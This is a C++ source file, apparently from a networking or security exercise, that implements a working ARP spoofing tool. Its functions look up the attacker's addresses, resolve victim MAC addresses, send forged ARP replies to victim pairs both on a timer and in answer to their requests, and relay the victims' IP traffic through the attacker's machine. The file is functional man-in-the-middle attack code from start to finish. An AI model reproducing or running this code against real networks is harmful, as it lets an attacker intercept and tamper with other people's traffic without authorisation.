/**
 * @file arp-spoof.cpp
 * 
 * @author apple8718@naver.com
 * @brief implement API for arp-spoof
 * @version 0.1
 * @date 2022-10-11
 * 
 * @copyright Copyright (c) 2022
 * 
 */
#include "arp-spoof.hpp"

/**
 * @brief Get Attacker's local MAC address and IP address
 * get MAC address in system direstory
 * get IP address using socket and I/O control
 * 
 * @param interface : user interface want to get information
 * @param MAC : User MAC address in interface
 * @param IP : User IP address in interface
 * 
 * @return true : success
 * @return false : failure
 */
bool getMyInfo(const std::string& interface, Mac& MAC, IPv4& IP) {
    int sockfd;
    struct ifreq ifr;

    // struct initialization
    memset(&ifr, 0, sizeof(struct ifreq));

#ifdef DEBUG
    std::cout << "[DEBUG] Successfully get into function 'getMyInfo'\n";
#endif

    // Find local MAC address ==================================================
    std::ifstream iface("/sys/class/net/" + interface + "/address");
    std::string tempMAC((std::istreambuf_iterator<char>(iface)), 
                        std::istreambuf_iterator<char>());

    if(tempMAC.length() == 0) {
        std::cerr << GET_MAC_ERROR_MSG;
        return false;
    }

    MAC = Mac(tempMAC);
    // =========================================================================

    // Find Local IP address ===================================================
    // Make socket which domain is IPv4 and type is UDP
    sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);

    if(sockfd == -1) {
        std::cerr << CREATE_SOCKET_ERROR_MSG;
        return false;
    }


#ifdef DEBUG
    std::cout << "[DEBUG] Successfully open socket\n";
#endif
    // Set protocol to IPv4
    ifr.ifr_addr.sa_family = AF_INET;

    // Put interface name to ifreq
    strncpy(ifr.ifr_name, interface.c_str(), IFNAMSIZ - 1);

    // IO control to get MAC
    if(ioctl(sockfd, SIOCGIFADDR, &ifr)) {
        std::cerr << IOCTL_ERROR_MSG;
        return false;
    }

#ifdef DEBUG
    std::cout << "[DEBUG] Successfully process ioctl\n";
#endif
    // Only one use and deep copy, so don't have to use inet_ntop 
    IP = IPv4(inet_ntoa(((sockaddr_in *)&ifr.ifr_addr)->sin_addr));

    // Socket close
    if(close(sockfd)) {
        std::cerr << CLOSE_ERROR_MSG;
        return false;
    }
    // =========================================================================

#ifdef DEBUG
    std::cout << "[DEBUG] Successfully close file descriptor\n";
#endif

    return true;
}

/**
 * @brief resolve MAC address by IP using ARP request
 * Use sendPacketARP function to send packet
 * 
 * @param pcap : pcap object for sending/receiving packet
 * @param MAC : MAC object want to get from IP
 * @param IP : IP address want to get MAC from
 * @param myMAC : user MAC address
 * @param myIP : user IP address
 * 
 * @return true : success
 * @return false : failure
 */
bool resolveMACByIP(pcap_t* pcap, Mac& MAC, const IPv4& IP, const Mac& myMAC, const IPv4& myIP) {
    struct pcap_pkthdr* header;
    const u_char* packet;
    int res;

    static std::map<IPv4, Mac> db;
    std::map<IPv4, Mac>::iterator it;
    struct ArpHdr* ARPHeaderPtr;

#ifdef DEBUG
    std::cout << "[DEBUG] Successfully get into function 'getMACByIP'\n";
#endif

    // If there exists matching MAC, return it
    it = db.find(IP);
    if(it != db.end()) {
        MAC = it->second;
        return true;
    }

    // send ARP packet
    // *** need to send repeatedly until receiving correct reply packet(Use thread!!) ***

    std::thread sender(sendARPRequest, pcap, myMAC, myIP, IP);

#ifdef DEBUG
    std::cout << "[DEBUG] Successfully send request packet\n";
#endif

    // receive ARP reply from gateway
    while( true ) {
        res = pcap_next_ex(pcap, &header, &packet);

        if (res == 0) continue;
		// PCAP_ERROR : When interface is down
		if (res == PCAP_ERROR or res == PCAP_ERROR_BREAK) {
			std::cout << PCAP_RECEIVE_PACKET_ERROR;
			std::cout << pcap_geterr(pcap) << std::endl;

			break;
		}
		
		if(packet == NULL) continue;

        // Receive ARP packet, so check if it is response of our request!
        ARPHeaderPtr = (struct ArpHdr*)(packet + sizeof(struct EthHdr));

        if(ArpHdr::Reply == ARPHeaderPtr->op()   and 
           myIP          == ARPHeaderPtr->tip()  and 
           myMAC         == ARPHeaderPtr->tmac() and 
           IP            == ARPHeaderPtr->sip()) {
            // signal to sender thread it is no longer need to send packet
            isEnd = true;
            break;
        }
    }

    // Deep copy from ARPHeader to MAC
    // Add [IP, MAC] pair to attackerARPTable
    db[IP] = MAC = ARPHeaderPtr->smac();

    sender.join();
    isEnd = false;

#ifdef DEBUG
    std::cout << "[DEBUG] Successfully get MAC address and join thread\n";
#endif

    return true;
}

/**
 * @brief Send one packet using pcap
 * 
 * @param pcap : pcap object for sending packet
 * @param packet : packet object want to send
 * 
 * @return true : success
 * @return false : failure
 */
bool sendPacket(pcap_t* pcap, const EthArpPacket& packet) {
#ifdef DEBUG
    std::cout << "[DEBUG] 'sendPacket' get lock of mPcap\n";
#endif
    mPcap.lock();
    int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    mPcap.unlock();
#ifdef DEBUG
    std::cout << "[DEBUG] 'sendPacket' did unlock of mPcap\n";
#endif

    if( res ) {
        std::cerr << SEND_PACKET_ERROR_MSG;
        std::cerr << pcap_geterr(pcap) << std::endl;

        return false;
    }

    return true;
}
/**
 * @brief Send one packet using pcap
 * 
 * @param pcap : pcap object for sending packet
 * @param packet : packet object want to send
 * @param packetLength : packet length
 * 
 * @return true : success
 * @return false : failure
 */
bool sendPacket(pcap_t* pcap, const uint8_t* packet, const int packetLength) {
#ifdef DEBUG
    std::cout << "[DEBUG] 'sendPacket' get lock of mPcap\n";
#endif
    mPcap.lock();
    int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(packet), packetLength);
    mPcap.unlock();
#ifdef DEBUG
    std::cout << "[DEBUG] 'sendPacket' did unlock of mPcap\n";
#endif

    if( res ) {
        std::cerr << SEND_PACKET_ERROR_MSG;
        std::cerr << pcap_geterr(pcap) << std::endl;
        
        return false;
    }

    return true;
}

/**
 * @brief Send ARP packet using pcap
 * send packet repeatedly until end flag turns true
 * 
 * @param pcap : pcap object for sending packet 
 * @param myMAC : user MAC address
 * @param myIP : user IP address
 * @param IP : IP address for getting ARP reply
 * 
 * @return true : success
 * @return false : failure
 */
bool sendARPRequest(pcap_t* pcap, const Mac& myMAC, const IPv4& myIP, const IPv4& IP) {
    // Use condition_variable for listening isEnd value
    std::unique_lock<std::mutex> lk(mRequest);
    
    EthArpPacket packet;

#ifdef DEBUG
    std::cout << "[DEBUG] Successfully get into function 'sendARPRequest'\n";
#endif

    ARPPacketInit(packet);
    ARPPacketSetting(packet, Mac::broadcastMac(), myMAC, myMAC, myIP, Mac::nullMac(), IP);
    packet.arp_.op_ = htons(ArpHdr::Request);

    // Send until endFlag goes true
    do {
        if(not sendPacket(pcap, packet)) return false;
#ifdef DEBUG
    std::cout << "[DEBUG] Successfully send packet\n";
#endif

    } while(not cvRequest.wait_for(lk, 5s, [](){ return not isEnd; }));

#ifdef DEBUG
    std::cout << "[DEBUG] Successfully send packet\n";
#endif

    return true;
}

/**
 * @brief initialize ARP packet for reply
 * reset op_ to use packet for other operation
 * 
 * @param : packet object for set
 */
void ARPPacketInit(EthArpPacket& packet) {
    // Set Ethernet header
	packet.eth_.type_ = htons(EthHdr::Arp);

    // Set ARP Header
    packet.arp_.hrd_  = htons(ArpHdr::ETHER);
    packet.arp_.pro_  = htons(EthHdr::Ipv4);
    packet.arp_.hln_  = Mac::SIZE;
    packet.arp_.pln_  = IPv4::SIZE;
    packet.arp_.op_   = htons(ArpHdr::Reply);
}

/**
 * @brief set packet for sending
 * 
 * @param packet : packet object want to set
 * @param destMAC : destination MAC used in Ethernet header
 * @param sourceMAC : source MAC used in Ethernet header
 * @param sendMAC : send MAC used in ARP header
 * @param sendIP : send IP used in ARP header
 * @param targetMAC : targetMAC used in ARP header
 * @param targetIP  : target IP used in ARP header
 */
void ARPPacketSetting(EthArpPacket& packet, 
                      const Mac& destMAC, const Mac& sourceMAC,     // for Ethernet
                      const Mac& sendMAC, const IPv4& sendIP,       // for ARP
                      const Mac& targetMAC, const IPv4& targetIP) {
    // Set Ethernet header
    packet.eth_.dmac_ = destMAC;
	packet.eth_.smac_ = sourceMAC;

    // Set ARP Header
    packet.arp_.smac_ = sendMAC;
    packet.arp_.sip_  = htonl(sendIP);
    packet.arp_.tmac_ = targetMAC;
    packet.arp_.tip_  = htonl(targetIP); 
}

/**
 * @brief send fake ARP packet periodically
 * use conditon_variable to wait isEnd value changing
 * 
 * @param pcap : pcap object for sending packet
 * @param myMAC : user MAC address
 * @param victims : a set of pairs consist of MAC/IP address of senders and targets
 * 
 * @return true : success 
 * @return false : failure
 */
bool periodAttack(pcap_t* pcap, const Mac& myMAC, const std::vector<attackInfo>& victims) {
    // Use condition_variable for listening isEnd value
    std::unique_lock<std::mutex> lk(mNonPeriod);

    EthArpPacket packet;
    ARPPacketInit(packet);

    // send fake packet to all victim pairs periodically
    do {
#ifdef DEBUG
        std::cout << "[DEBUG] period attack\n";
#endif
        for(auto a : victims) {
            ARPPacketSetting(packet, a.sendMAC, myMAC, myMAC, a.targetIP, a.sendMAC, a.sendIP);

            if(not sendPacket(pcap, packet)) return false;
        }
    } while(not cvPeriod.wait_for(lk, 5s, [](){ return not isEnd; }));

#ifdef DEBUG
        std::cout << "[DEBUG] isEnd = " << (isEnd ? "True" : "False") << '\n';
        std::cout << "[DEBUG] period attack terminated\n";
#endif

    return true;
}

/**
 * @brief manage packets from sender and target
 * if received packet is using ARP, send non-periodical ARP reply attack packet
 * if received packet is using IP, reply it
 * 
 * @param pcap : pcap object for sending/receiving packet
 * @param myMAC : user MAC address
 * @param victims : a set of pairs consist of MAC/IP address of senders and targets
 * 
 * @return true : success
 * @return false : failure
 */
bool managePackets(pcap_t* pcap, const Mac& myMAC, const std::vector<attackInfo>& victims) {
    struct pcap_pkthdr* header;
    const u_char* packet;
    int res;

    struct ArpHdr* ARPHeaderPtr;
    struct EthHdr* EthHeaderPtr;
    struct IPv4Hdr* IPv4HeaderPtr;

    EthArpPacket packet4Send;
    ARPPacketInit(packet4Send);

    while(not isEnd) {
        res = pcap_next_ex(pcap, &header, &packet);

        if (res == 0) continue;
		// PCAP_ERROR : When interface is down
		if (res == PCAP_ERROR or res == PCAP_ERROR_BREAK) {
			std::cout << PCAP_RECEIVE_PACKET_ERROR;
			std::cout << pcap_geterr(pcap) << std::endl;

			break;
		}
		
		if(packet == NULL) continue;

        // There is four types of packet
        // 1. ARP_REQ from sender by broadcast
        // 2. ARP_REQ from target by broadcast
        // 3. ARP_REQ from sender by unique request
        // 4. IP packet from sender to target

        // Check whether its protocol is ARP or IP
        EthHeaderPtr = (struct EthHdr*)packet;

        for(auto victim : victims) {
            // In case of neither (1, 3) nor 2 => continue
            if((EthHeaderPtr->smac() != victim.sendMAC) and 
               (EthHeaderPtr->smac() != victim.targetMAC or EthHeaderPtr->dmac() != Mac::broadcastMac())) continue;

            switch(EthHeaderPtr->type()) {
                case EthHdr::Arp:   // Case 1, 2, 3
                    ARPHeaderPtr = (struct ArpHdr*)(packet + sizeof(struct EthHdr));
                    if((ARPHeaderPtr->tip() == victim.sendIP and ARPHeaderPtr->sip() == victim.targetIP) or // Case 2
                       (ARPHeaderPtr->sip() == victim.sendIP and ARPHeaderPtr->tip() == victim.targetIP)) { // Case 1, 3
                        // send fake ARP reply packet non-periodically
                        ARPPacketSetting(packet4Send, victim.sendMAC, myMAC, 
                                         myMAC, victim.targetIP, victim.sendMAC, victim.sendIP);
                        sendPacket(pcap, packet4Send);
                    }
                    break;
                case EthHdr::Ipv4:  // Case 4
                    // Relay received packet
                    if(EthHeaderPtr->smac() != victim.sendMAC) break;

                    IPv4HeaderPtr = (struct IPv4Hdr*)(packet + sizeof(struct EthHdr));
                    if(IPv4HeaderPtr->ip_dst == victim.targetIP) {
                        EthHeaderPtr->smac_ = myMAC;
                        EthHeaderPtr->dmac_ = victim.targetMAC;

#ifdef DEBUG
                        std::cout << "[DEBUG] Received IP packet\n";
#endif

                        sendPacket(pcap, packet, header->len);
                    }
                    break;
                default: break;
            }
        }
    }

    return true;
}

/**
 * @brief print information of Attacker, sender, and target
 * 
 * @param myMAC : user MAC address
 * @param myIP : user IP address
 * @param sendMAC : sender's MAC adderess
 * @param sendIP : sender's IP address
 * @param targetMAC : target's MAC adderess
 * @param targetIP :target's IP adderess
 */
void printInfo(const Mac& myMAC, const IPv4& myIP, 
               const Mac& sendMAC, const IPv4& sendIP, 
               const Mac& targetMAC, const IPv4& targetIP) {
    std::cout << "========================================\n"; 
    std::cout << "========================================\n"; 
    std::cout << "[[Attacker's Info]]\n"; 
    std::cout << "[MAC] " << std::string(myMAC) << '\n';
    std::cout << "[IP]  " << std::string(myIP) << '\n';
    std::cout << "========================================\n"; 
    std::cout << "[[Sender's Info]]\n"; 
    std::cout << "[MAC] " << std::string(sendMAC) << '\n'; 
    std::cout << "[IP]  " << std::string(sendIP) << '\n'; 
    std::cout << "========================================\n"; 
    std::cout << "[[Target's Info]]\n";
    std::cout << "[MAC] " << std::string(targetMAC) << '\n'; 
    std::cout << "[IP]  " << std::string(targetIP) << '\n'; 
    std::cout << "========================================\n";
    std::cout << "========================================\n";
}